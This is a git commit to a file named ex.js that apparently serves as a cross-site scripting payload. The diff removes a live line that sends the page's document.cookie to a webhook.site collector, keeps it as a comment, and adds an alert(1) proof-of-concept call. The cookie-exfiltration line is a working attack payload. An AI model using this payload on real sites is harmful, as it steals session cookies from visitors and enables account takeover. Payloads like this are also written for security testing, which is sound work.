c032c573846c1768461d63464ac73a468ae89ef9
zkvlkat <132288380+zkvlkat@users.noreply.github.com>
2024-08-03 08:32:49 +0900

    ex.js updated

--- ex.js
+++ ex.js
@@ -1,1 +1,2 @@
-fetch("https://webhook.site/8c153859-d828-4ebd-b947-744600e919af?a="+document.cookie);
+//fetch("https://webhook.site/8c153859-d828-4ebd-b947-744600e919af?a="+document.cookie);
+alert(1);
